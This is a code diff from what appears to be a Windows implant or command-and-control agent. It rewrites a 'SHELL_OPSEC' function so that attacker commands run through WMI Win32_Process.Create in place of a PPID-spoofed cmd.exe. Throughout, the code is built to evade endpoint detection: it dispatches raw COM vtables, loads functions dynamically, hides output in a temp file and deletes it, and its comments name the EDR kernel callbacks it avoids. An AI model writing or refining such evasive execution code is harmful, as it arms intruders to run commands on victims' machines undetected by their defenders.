@@ -2201,70 +2201,149 @@ static char *gen_lnk(const char *target, const char *lnk_args,
 }
 #endif /* _WIN32 */
 
-// ── SHELL_OPSEC: cmd.exe with PPID spoofed to RuntimeBroker/explorer ─────────
+// ── SHELL_OPSEC: WMI Win32_Process.Create() → spawns under WmiPrvSE.exe ──────
+// Raw vtable dispatch + dynamic proc loading — no wbemidl.h, no wbemuuid link.
+// Process creation via WMI avoids opening PROCESS_CREATE_PROCESS handles and
+// InitializeProcThreadAttributeList calls that EDR kernel callbacks monitor.
 
 static char *run_shell_opsec(const char *cmd) {
-    HANDLE hParent = NULL;
-    PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
-    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnap != INVALID_HANDLE_VALUE) {
-        if (Process32First(hSnap, &pe)) {
-            do {
-                if (lstrcmpiA(pe.szExeFile, "RuntimeBroker.exe") == 0) {
-                    HANDLE h = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pe.th32ProcessID);
-                    if (h) { if (hParent) CloseHandle(hParent); hParent = h; break; }
-                } else if (lstrcmpiA(pe.szExeFile, "explorer.exe") == 0 && !hParent) {
-                    HANDLE h = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pe.th32ProcessID);
-                    if (h) hParent = h;
-                }
-            } while (Process32Next(hSnap, &pe));
-        }
-        CloseHandle(hSnap);
-    }
-    if (!hParent) return run_shell(cmd);
-
     char out_path[MAX_PATH];
-    snprintf(out_path, MAX_PATH, "C:\\Windows\\Temp\\sbo%08lx%08lx.tmp",
-             (unsigned long)GetCurrentProcessId(), (unsigned long)GetTickCount());
     char cmdline[4096];
+    char *result = NULL;
+    HRESULT hr;
+
+    snprintf(out_path, MAX_PATH, "C:\\ProgramData\\sbo%08lx%08lx.tmp",
+             (unsigned long)GetCurrentProcessId(), (unsigned long)GetTickCount());
     snprintf(cmdline, sizeof(cmdline), "cmd.exe /d /c %s > \"%s\" 2>&1", cmd, out_path);
 
-    SIZE_T attrSize = 0;
-    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
-    LPPROC_THREAD_ATTRIBUTE_LIST pAttr = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
-    if (!pAttr) { CloseHandle(hParent); return run_shell(cmd); }
-    InitializeProcThreadAttributeList(pAttr, 1, 0, &attrSize);
-    UpdateProcThreadAttribute(pAttr, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
-                              &hParent, sizeof(hParent), NULL, NULL);
+    HMODULE ole32  = GetModuleHandleA("ole32.dll");
+    if (!ole32)  ole32  = LoadLibraryA("ole32.dll");
+    HMODULE oleat = GetModuleHandleA("oleaut32.dll");
+    if (!oleat)  oleat  = LoadLibraryA("oleaut32.dll");
+    if (!ole32 || !oleat) return run_shell(cmd);
 
-    STARTUPINFOEXA si; memset(&si, 0, sizeof(si));
-    si.StartupInfo.cb = sizeof(si);
-    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
-    si.StartupInfo.wShowWindow = SW_HIDE;
-    si.lpAttributeList = pAttr;
+    HRESULT (__stdcall *pfnCoInit)(void*,DWORD) =
+        (void*)GetProcAddress(ole32,"CoInitializeEx");
+    HRESULT (__stdcall *pfnCoInitSec)(void*,LONG,void*,void*,DWORD,DWORD,void*,DWORD,void*) =
+        (void*)GetProcAddress(ole32,"CoInitializeSecurity");
+    HRESULT (__stdcall *pfnCoCreate)(const GUID*,void*,DWORD,const GUID*,void**) =
+        (void*)GetProcAddress(ole32,"CoCreateInstance");
+    HRESULT (__stdcall *pfnCoProxy)(void*,DWORD,DWORD,void*,DWORD,DWORD,void*,DWORD) =
+        (void*)GetProcAddress(ole32,"CoSetProxyBlanket");
+    void   (__stdcall *pfnCoUninit)(void) = (void*)GetProcAddress(ole32,"CoUninitialize");
+    WCHAR* (__stdcall *pfnSysAlloc)(const WCHAR*) = (void*)GetProcAddress(oleat,"SysAllocString");
+    void   (__stdcall *pfnSysFree)(WCHAR*)  = (void*)GetProcAddress(oleat,"SysFreeString");
+    void   (__stdcall *pfnVarClear)(void*)  = (void*)GetProcAddress(oleat,"VariantClear");
+    if (!pfnCoInit || !pfnCoCreate || !pfnSysAlloc) return run_shell(cmd);
 
-    PROCESS_INFORMATION pi; memset(&pi, 0, sizeof(pi));
-    BOOL ok = CreateProcessA(NULL, cmdline, NULL, NULL, FALSE,
-                             CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
-                             NULL, NULL, (LPSTARTUPINFOA)&si, &pi);
-    DeleteProcThreadAttributeList(pAttr);
-    HeapFree(GetProcessHeap(), 0, pAttr);
-    CloseHandle(hParent);
+    /* WMI GUIDs (defined inline — no wbemuuid.lib needed) */
+    static const GUID CLSID_WL = {0x4590f811,0x1d3a,0x11d0,{0x89,0x1f,0x00,0xaa,0x00,0x4b,0x2e,0x24}};
+    static const GUID IID_WL   = {0xdc12a687,0x737f,0x11cf,{0x88,0x4d,0x00,0xaa,0x00,0x4b,0x2e,0x24}};
 
-    if (!ok) return run_shell(cmd);
+    /* Minimal VARIANT matching Windows layout (16 bytes on x64) */
+    typedef struct { WORD vt; WORD r1,r2,r3; union { LONGLONG ll; WCHAR *bstr; DWORD dw; } u; } WMIVAR;
 
-    WaitForSingleObject(pi.hProcess, 30000);
-    CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
+    /* Raw COM object: vtable pointer is first field */
+    typedef struct { void **vtbl; } WmiObj;
+    typedef ULONG   (__stdcall *FnRel)(WmiObj*);
+    typedef HRESULT (__stdcall *FnCS) (WmiObj*,WCHAR*,WCHAR*,WCHAR*,WCHAR*,LONG,WCHAR*,WmiObj*,WmiObj**);
+    typedef HRESULT (__stdcall *FnGO) (WmiObj*,WCHAR*,LONG,WmiObj*,WmiObj**,WmiObj**);
+    typedef HRESULT (__stdcall *FnGM) (WmiObj*,LPCWSTR,LONG,WmiObj**,WmiObj**);
+    typedef HRESULT (__stdcall *FnSI) (WmiObj*,LONG,WmiObj**);
+    typedef HRESULT (__stdcall *FnPut)(WmiObj*,LPCWSTR,LONG,WMIVAR*,LONG);
+    typedef HRESULT (__stdcall *FnGet)(WmiObj*,LPCWSTR,LONG,WMIVAR*,LONG*,LONG*);
+    typedef HRESULT (__stdcall *FnEM) (WmiObj*,WCHAR*,WCHAR*,LONG,WmiObj*,WmiObj*,WmiObj**,WmiObj**);
+#define WR(o) do{if(o){((FnRel)(o)->vtbl[2])(o);(o)=NULL;}}while(0)
 
-    FILE *f = fopen(out_path, "rb");
-    if (!f) return strdup("[no output]");
-    fseek(f, 0, SEEK_END); long sz = ftell(f); fseek(f, 0, SEEK_SET);
-    char *buf = (char*)malloc(sz + 1);
-    if (!buf) { fclose(f); return strdup("[oom]"); }
-    fread(buf, 1, sz, f); fclose(f);
-    buf[sz] = '\0';
-    DeleteFileA(out_path);
-    return buf;
+    WmiObj *pLoc=NULL, *pSvc=NULL, *pCls=NULL, *pIn=NULL, *pInst=NULL, *pOut=NULL;
+    DWORD child_pid = 0;
+    WCHAR *bsNS=NULL, *bsCls=NULL, *bsCls2=NULL, *bsMth=NULL;
+
+    hr = pfnCoInit(NULL, 0); /* COINIT_MULTITHREADED */
+    if (FAILED(hr) && hr != (HRESULT)0x80010106L) goto wmi_done;
+    if (pfnCoInitSec) pfnCoInitSec(NULL,-1,NULL,NULL,6,3,NULL,0,NULL);
+
+    hr = pfnCoCreate(&CLSID_WL,NULL,1/*CLSCTX_INPROC_SERVER*/,&IID_WL,(void**)&pLoc);
+    if (FAILED(hr)||!pLoc) goto wmi_done;
+
+    /* IWbemLocator::ConnectServer [vtbl 3] */
+    bsNS = pfnSysAlloc(L"ROOT\\CIMV2");
+    hr = ((FnCS)pLoc->vtbl[3])(pLoc,bsNS,NULL,NULL,NULL,0,NULL,NULL,&pSvc);
+    pfnSysFree(bsNS); bsNS=NULL;
+    if (FAILED(hr)||!pSvc) goto wmi_done;
+    if (pfnCoProxy) pfnCoProxy(pSvc,10/*WINNT*/,0,NULL,4/*CALL*/,3/*IMPERSONATE*/,NULL,0);
+
+    /* IWbemServices::GetObject [vtbl 6] */
+    bsCls = pfnSysAlloc(L"Win32_Process");
+    hr = ((FnGO)pSvc->vtbl[6])(pSvc,bsCls,0,NULL,&pCls,NULL);
+    pfnSysFree(bsCls); bsCls=NULL;
+    if (FAILED(hr)||!pCls) goto wmi_done;
+
+    /* IWbemClassObject::GetMethod [vtbl 20] — in-params definition for "Create" */
+    hr = ((FnGM)pCls->vtbl[20])(pCls,L"Create",0,&pIn,NULL);
+    if (FAILED(hr)||!pIn) goto wmi_done;
+
+    /* IWbemClassObject::SpawnInstance [vtbl 16] */
+    hr = ((FnSI)pIn->vtbl[16])(pIn,0,&pInst);
+    if (FAILED(hr)||!pInst) goto wmi_done;
+
+    { /* IWbemClassObject::Put [vtbl 5] — set CommandLine */
+        int wlen = MultiByteToWideChar(CP_ACP,0,cmdline,-1,NULL,0);
+        WCHAR *wcmd = (WCHAR*)HeapAlloc(GetProcessHeap(),0,wlen*sizeof(WCHAR));
+        if (wcmd) {
+            WMIVAR v; memset(&v,0,sizeof(v));
+            MultiByteToWideChar(CP_ACP,0,cmdline,-1,wcmd,wlen);
+            v.vt=8/*VT_BSTR*/; v.u.bstr=pfnSysAlloc(wcmd);
+            HeapFree(GetProcessHeap(),0,wcmd);
+            ((FnPut)pInst->vtbl[5])(pInst,L"CommandLine",0,&v,0);
+            if (pfnVarClear) pfnVarClear(&v);
+            else if (v.u.bstr) pfnSysFree(v.u.bstr);
+        }
+    }
+
+    /* IWbemServices::ExecMethod [vtbl 24] */
+    bsCls2 = pfnSysAlloc(L"Win32_Process");
+    bsMth  = pfnSysAlloc(L"Create");
+    hr = ((FnEM)pSvc->vtbl[24])(pSvc,bsCls2,bsMth,0,NULL,pInst,&pOut,NULL);
+    pfnSysFree(bsCls2); bsCls2=NULL;
+    pfnSysFree(bsMth);  bsMth=NULL;
+
+    /* IWbemClassObject::Get [vtbl 4] — read ProcessId from output */
+    if (pOut) {
+        WMIVAR vp; memset(&vp,0,sizeof(vp));
+        ((FnGet)pOut->vtbl[4])(pOut,L"ProcessId",0,&vp,NULL,NULL);
+        if (vp.vt==3/*VT_I4*/||vp.vt==19/*VT_UI4*/) child_pid=(DWORD)vp.u.dw;
+        if (pfnVarClear) pfnVarClear(&vp);
+    }
+
+    /* Wait for WMI-spawned child */
+    if (child_pid) {
+        HANDLE hc = OpenProcess(SYNCHRONIZE,FALSE,child_pid);
+        if (hc) { WaitForSingleObject(hc,30000); CloseHandle(hc); }
+        else Sleep(8000);
+    } else Sleep(8000);
+
+    /* Read output file */
+    {
+        HANDLE hf = CreateFileA(out_path,GENERIC_READ,FILE_SHARE_READ|FILE_SHARE_WRITE,
+                                NULL,OPEN_EXISTING,0,NULL);
+        if (hf!=INVALID_HANDLE_VALUE) {
+            DWORD sz = GetFileSize(hf,NULL);
+            if (sz>0 && sz<4*1024*1024) {
+                result = (char*)malloc(sz+1);
+                DWORD rd=0; ReadFile(hf,result,sz,&rd,NULL);
+                if (result) result[rd]='\0';
+            }
+            CloseHandle(hf);
+            DeleteFileA(out_path);
+        }
+    }
+
+wmi_done:
+    WR(pOut); WR(pInst); WR(pIn); WR(pCls); WR(pSvc); WR(pLoc);
+    if (pfnCoUninit) pfnCoUninit();
+#undef WR
+    return result ? result : run_shell(cmd);
 }
 
 // ── Dispatcher ────────────────────────────────────────────────────────────────
